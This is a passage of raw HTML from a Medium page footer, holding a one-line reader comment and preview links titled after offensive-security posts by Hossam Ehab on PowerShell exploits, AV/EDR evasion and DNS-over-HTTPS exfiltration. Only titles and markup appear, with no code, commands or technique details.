viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.385 12c0 .55.2 1.02.59 1.41.39.4.86.59 1.41.59s1.02-.2 1.41-.59c.4-.39.59-.86.59-1.41s-.2-1.02-.59-1.41a1.93 1.93 0 0 0-1.41-.59c-.55 0-1.02.2-1.41.59-.4.39-.59.86-.59 1.41m5.62 0c0 .55.2 1.02.58 1.41.4.4.87.59 1.42.59s1.02-.2 1.41-.59c.4-.39.59-.86.59-1.41s-.2-1.02-.59-1.41a1.93 1.93 0 0 0-1.41-.59c-.55 0-1.03.2-1.42.59s-.58.86-.58 1.41m5.6 0c0 .55.2 1.02.58 1.41.4.4.87.59 1.43.59s1.03-.2 1.42-.59.58-.86.58-1.41-.2-1.02-.58-1.41a1.93 1.93 0 0 0-1.42-.59c-.56 0-1.04.2-1.43.59s-.58.86-.58 1.41" clip-rule="evenodd"></path></svg></button></div></div><div class="zj m he"><pre class="tr"><div class="zk m"><div class="bg b bh ab bl"><div class="xx">Very cool technique</div></div></div></pre></div><div class="zl ac r kr cw"><div class="ac r ae"><div class="ac r kr ks"><div class="pw-multi-vote-icon fr afy ku kv kw"><span data-dd-action-name="Susi presentation tracker respond_sidebar"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fc3d83ae6c5b3&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40ezqoxzx395%2Fvery-cool-technique-c3d83ae6c5b3&amp;user=Security+geek&amp;userId=225b485cc148&amp;source=---post_responses--c3d83ae6c5b3----0-----------------respond_sidebar------------------" data-discover="true"><div class="kx aq ky kz la lb ao lc ld le kw" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></a></span></div></div><p class="bg b ec ab bl"><button class="ah ai aj fo al am an ao ap aq ar as at ov">Reply</button></p></div></div></div></div></div></div></div></div><div class="uv uw ux uy uz m bx"><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="zm zn dt du dv qz m"><h2 class="bg te mx mz na nb nd ne nf nh ni nj nl nm nn np nq bl">More from Hossam Ehab</h2></div><div class="zo ac kr ji zp zq zr zs zt zu zv zw zx zy zz aba abb abc abd"><div class="abe abf abg tc abh abi abj tb abk abl abm abn abo abp abq abr abs abt abu abv abw"><div class="abx aby abz aca acb ed m"><article class="ed" data-testid="post-preview"><div class="ed rv m"><div class="bi ed"><div class="ed m"><div class="fr ed acc acd ace acf acg ach aci acj ack acl acm acn aco" role="link" data-href="https://medium.com/@0xHossam/powershell-exploits-modern-apts-and-their-malicious-scripting-tactics-7f98b0e8090c" tabindex="0"><div class="acp"><div aria-label="PowerShell Exploits — Modern APTs and Their Malicious Scripting Tactics"><div class="acr acs act acu cc"><img alt="PowerShell Exploits — Modern APTs and Their Malicious Scripting Tactics" class="bi acv acw acx bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/1*x-Znot5b8frVpDTar4310A.jpeg"></div></div></div><div class="acq ac ci cv"><div class="ac cv xv bi acy acz ada adb"><div class="adc add ade adf adg ac r"><div class="rm m"><div class="m"><div><div class="m" aria-describedby="96" aria-labelledby="96" role="tooltip"><div tabindex="-1" class="bf"><a tabindex="-1" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----0---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><div class="m fr"><img alt="Hossam Ehab" class="m fk by adh adi de" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m adh adi fw o ak gk"></div></div></a></div></div></div></div></div><div><div class="m" aria-describedby="97" aria-labelledby="97" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at jg ac r" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----0---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><p class="bg b ec ab ga zc zd ze zf zg zh zi bl">Hossam Ehab</p></a></div></div></div></div><div class="adj m adk adl adm adn ado he"></div><span class="bg b ec ab eb"><div class="ss ac cw ag"><div class="ac r afh"><span>Feb 14, 2025</span><div class=""><div class="fr aff do ac r"><div class="fw xb afg ac r afh"><div class="fn do afi m de"></div></div><a class="fw lp afg ac r afh" tabindex="-1" rel="noopener follow" href="https://medium.com/@0xHossam/powershell-exploits-modern-apts-and-their-malicious-scripting-tactics-7f98b0e8090c?source=post_page---author_recirc--3229b75618f7----0---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><div><div class="ac" aria-describedby="215" aria-labelledby="215" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r za"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>890</span></div></div></div></div><div><div class="ac" aria-describedby="98" aria-labelledby="98" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r za"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#6B6B6B" aria-labelledby="response-filled-16px-desc" viewBox="0 0 16 16"><desc id="response-filled-16px-desc">A response icon</desc><path fill="#6B6B6B" d="M12.344 11.458A5.28 5.28 0 0 0 14 7.526C14 4.483 11.391 2 8.051 2S2 4.483 2 7.527c0 3.051 2.712 5.526 6.059 5.526a6.6 6.6 0 0 0 1.758-.236q.255.223.554.414c.784.51 1.626.768 2.512.768a.37.37 0 0 0 .355-.214.37.37 0 0 0-.03-.384 4.7 4.7 0 0 1-.857-1.958v.014z"></path></svg><span>6</span></div></div></div></div></a></div></div></div><div class="ac r afk afl"><div class="afj"></div><div class=""><div><div class="bn" aria-describedby="99" aria-labelledby="99" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F7f98b0e8090c&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Fpowershell-exploits-modern-apts-and-their-malicious-scripting-tactics-7f98b0e8090c&amp;source=---author_recirc--3229b75618f7----0-----------------bookmark_preview----7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><span class="afj"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span><div class="k j e"><div class="ty bi va lo"></div></div></div></div></div></div></div></div></article></div></div><div class="abe abf abg tc abh abi abj tb abk abl abm abn abo abp abq abr abs abt abu abv abw"><div class="abx aby abz aca acb ed m"><article class="ed" data-testid="post-preview"><div class="ed rv m"><div class="bi ed"><div class="ed m"><div class="fr ed acc acd ace acf acg ach aci acj ack acl acm acn aco" role="link" data-href="https://medium.com/@0xHossam/av-edr-evasion-malware-development-933e50f47af5" tabindex="0"><div class="acp"><div aria-label="AV/EDR Evasion | Malware Development"><div class="acr acs act acu cc"><img alt="AV/EDR Evasion | Malware Development" class="bi acv acw acx bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/1*8PfEF1XfP6QdDN-owGlEyg.png"></div></div></div><div class="acq ac ci cv"><div class="ac cv xv bi acy acz ada adb"><div class="adc add ade adf adg ac r"><div class="rm m"><div class="m"><div><div class="m" aria-describedby="100" aria-labelledby="100" role="tooltip"><div tabindex="-1" class="bf"><a tabindex="-1" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----1---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><div class="m fr"><img alt="Hossam Ehab" class="m fk by adh adi de" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m adh adi fw o ak gk"></div></div></a></div></div></div></div></div><div><div class="m" aria-describedby="101" aria-labelledby="101" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at jg ac r" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----1---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><p class="bg b ec ab ga zc zd ze zf zg zh zi bl">Hossam Ehab</p></a></div></div></div></div><div class="adj m adk adl adm adn ado he"></div><span class="bg b ec ab eb"><div class="ss ac cw ag"><div class="ac r afh"><span>Feb 17, 2023</span><div class=""><div class="fr aff do ac r"><div class="fw xb afg ac r afh"><div class="fn do afi m de"></div></div><a class="fw lp afg ac r afh" tabindex="-1" rel="noopener follow" href="https://medium.com/@0xHossam/av-edr-evasion-malware-development-933e50f47af5?source=post_page---author_recirc--3229b75618f7----1---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><div><div class="ac" aria-describedby="217" aria-labelledby="217" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r za"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>720</span></div></div></div></div><div><div class="ac" aria-describedby="102" aria-labelledby="102" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r za"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#6B6B6B" aria-labelledby="response-filled-16px-desc" viewBox="0 0 16 16"><desc id="response-filled-16px-desc">A response icon</desc><path fill="#6B6B6B" d="M12.344 11.458A5.28 5.28 0 0 0 14 7.526C14 4.483 11.391 2 8.051 2S2 4.483 2 7.527c0 3.051 2.712 5.526 6.059 5.526a6.6 6.6 0 0 0 1.758-.236q.255.223.554.414c.784.51 1.626.768 2.512.768a.37.37 0 0 0 .355-.214.37.37 0 0 0-.03-.384 4.7 4.7 0 0 1-.857-1.958v.014z"></path></svg><span>1</span></div></div></div></div></a></div></div></div><div class="ac r afk afl"><div class="afj"></div><div class=""><div><div class="bn" aria-describedby="103" aria-labelledby="103" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F933e50f47af5&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Fav-edr-evasion-malware-development-933e50f47af5&amp;source=---author_recirc--3229b75618f7----1-----------------bookmark_preview----7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><span class="afj"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span><div class="k j e"><div class="ty bi va lo"></div></div></div></div></div></div></div></div></article></div></div><div class="abe abf abg tc abh abi abj tb abk abl abm abn abo abp abq abr abs abt abu abv abw"><div class="abx aby abz aca acb ed m"><article class="ed" data-testid="post-preview"><div class="ed rv m"><div class="bi ed"><div class="ed m"><div class="fr ed acc acd ace acf acg ach aci acj ack acl acm acn aco" role="link" data-href="https://medium.com/@0xHossam/evading-detection-and-stealthy-data-exfiltration-with-dns-over-https-doh-ee134b5766d4" tabindex="0"><div class="acp"><div aria-label="Evading Detection and Stealthy Data Exfiltration with DNS over HTTPS (DoH)"><div class="acr acs act acu cc"><img alt="Evading Detection and Stealthy Data Exfiltration with DNS over HTTPS (DoH)" class="bi acv acw acx bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/0*ZSN3XwGdRR1AsG8-"></div></div></div><div class="acq ac ci cv"><div class="ac cv xv bi acy acz ada adb"><div class="adc add ade adf adg ac r"><div class="rm m"><div class="m"><div><div class="m" aria-describedby="104" aria-labelledby="104" role="tooltip"><div tabindex="-1" class="bf"><a tabindex="-1" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----2---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><div class="m fr"><img alt="Hossam Ehab" class="m fk by adh adi de" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m adh adi fw o ak gk"></div></div></a></div></div></div></div></div><div><div class="m" aria-describedby="105" aria-labelledby="105" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at jg ac r" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----2---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><p class="bg b ec ab ga zc zd ze zf zg zh zi bl">Hossam Ehab</p></a></div></div></div></div><div class="adj m adk adl adm adn ado he"></div><span class="bg b ec ab eb"><div class="ss ac cw ag"><div class="ac r afh"><span>Jun 27, 2024</span><div class=""><div class="fr aff do ac r"><div class="fw xb afg ac r afh"><div class="fn do afi m de"></div></div><a class="fw lp afg ac r afh" tabindex="-1" rel="noopener follow" href="https://medium.com/@0xHossam/evading-detection-and-stealthy-data-exfiltration-with-dns-over-https-doh-ee134b5766d4?source=post_page---author_recirc--3229b75618f7----2---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><div><div class="ac" aria-describedby="219" aria-labelledby="219" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r za"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>564</span></div></div></div></div></a></div></div></div><div class="ac r afk afl"><div class="afj"></div><div class=""><div><div class="bn" aria-describedby="106" aria-labelledby="106" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fee134b5766d4&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Fevading-detection-and-stealthy-data-exfiltration-with-dns-over-https-doh-ee134b5766d4&amp;source=---author_recirc--3229b75618f7----2-----------------bookmark_preview----7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><span class="afj"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span><div class="k j e"><div class="ty bi va lo"></div></div></div></div></div></div></div></div></article></div></div><div class="abe abf abg tc abh abi abj tb abk abl abm abn abo abp abq abr abs abt abu abv abw"><div class="abx aby abz aca acb ed m"><article class="ed" data-testid="post-preview"><div class="ed rv m"><div class="bi ed"><div class="ed m"><div class="fr ed acc acd ace acf acg ach aci acj ack acl acm acn aco" role="link" data-href="https://medium.com/@0xHossam/av-edr-evasion-malware-development-p-4-162662bb630e" tabindex="0"><div class="acp"><div aria-label="AV/EDR Evasion | Malware Development P — 4"><div class="acr acs act acu cc"><img alt="AV/EDR Evasion | Malware Development P — 4" class="bi acv acw acx bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/1*i1XzohCsf11bGfwe9IyaeQ.png"></div></div></div><div class="acq ac ci cv"><div class="ac cv xv bi acy acz ada adb"><div class="adc add ade adf adg ac r"><div class="rm m"><div class="m"><div><div class="m" aria-describedby="107" aria-labelledby="107" role="tooltip"><div tabindex="-1" class="bf"><a tabindex="-1" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----3---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><div class="m fr"><img alt="Hossam Ehab" class="m fk by adh adi de" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m adh adi fw o ak gk"></div></div></a></div></div></div></div></div><div><div class="m" aria-describedby="108" aria-labelledby="108" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at jg ac r" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----3---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><p class="bg b ec ab ga zc zd ze zf zg zh zi bl">Hossam Ehab</p></a></div></div></div></div><div class="adj m adk adl adm adn ado he"></div><span class="bg b ec ab eb"><div class="ss ac cw ag"><div class="ac r afh"><span>May 27, 2023</span><div class=""><div class="fr aff do ac r"><div class="fw xb afg ac r afh"><div class="fn do afi m de"></div></div><a class="fw lp afg ac r afh" tabindex="-1" rel="noopener follow" href="https://medium.com/@0xHossam/av-edr-evasion-malware-development-p-4-162662bb630e?source=post_page---author_recirc--3229b75618f7----3---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><div><div class="ac" aria-describedby="220" aria-labelledby="220" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r za"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>419</span></div></div></div></div><div><div class="ac" aria-describedby="109" aria-labelledby="109" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r za"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#6B6B6B" aria-labelledby="response-filled-16px-desc" viewBox="0 0 16 16"><desc id="response-filled-16px-desc">A response icon</desc><path fill="#6B6B6B" d="M12.344 11.458A5.28 5.28 0 0 0 14 7.526C14 4.483 11.391 2 8.051 2S2 4.483 2 7.527c0 3.051 2.712 5.526 6.059 5.526a6.6 6.6 0 0 0 1.758-.236q.255.223.554.414c.784.51 1.626.768 2.512.768a.37.37 0 0 0 .355-.214.37.37 0 0 0-.03-.384 4.7 4.7 0 0 1-.857-1.958v.014z"></path></svg><span>1</span></div></div></div></div></a></div></div></div><div class="ac r afk afl"><div class="afj"></div><div class=""><div><div class="bn" aria-describedby="110" aria-labelledby="110" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F162662bb630e&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Fav-edr-evasion-malware-development-p-4-162662bb630e&amp;source=---author_recirc--3229b75618f7----3-----------------bookmark_preview----7364dac9_6352_481d_8ca5_16efd798d146--------------" data-discover="true"><span class="afj"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span></div></div></div></div></div></div></article></div></div></div><div class="ty bi va dr ds afm afn afo"></div><div class="ac sh sg ir it iv"><a class="bg b bh ab bl rn uj uk ul lu lr um fc fd fe un uo up fh uq ur us ut uu fi fj fk bn fl fm" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7---------------------------------------" data-discover="true"><div class="m fm">See all from Hossam Ehab</div></a></div></div></div><div class="ty bi va afp afq afr afs aft"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="afu afv m"><h2 class="bg te mx mz na nb nd ne nf nh ni nj nl nm nn np nq bl">Recommended from Medium</h2><div class="pq pr ps pt pu m"><div class="zo ac kr ji zp zq zr zs zt zu zv zw zx zy zz aba abb abc abd"><div class="abe abf abg tc abh abi abj tb abk abl abm abn abo abp abq abr abs abt abu abv abw"><div class="abx aby abz aca acb ed m"><article class="ed" data-testid="post-preview"><div class="ed rv m"><div class="bi ed"><div class="ed m"><div class="fr ed acc acd ace acf acg ach aci acj ack acl acm acn aco" role="link" data-href="https://medium.com/bugbountywriteup/active-directory-lab-for-pentest-manual-deployment-guide-cab28cd4ad8d" tabindex="0"><div class="acp"><div aria-label="Active Directory Lab for PenTest. Manual Deployment Guide"><div class="acr acs act acu cc"><img alt="Active Directory 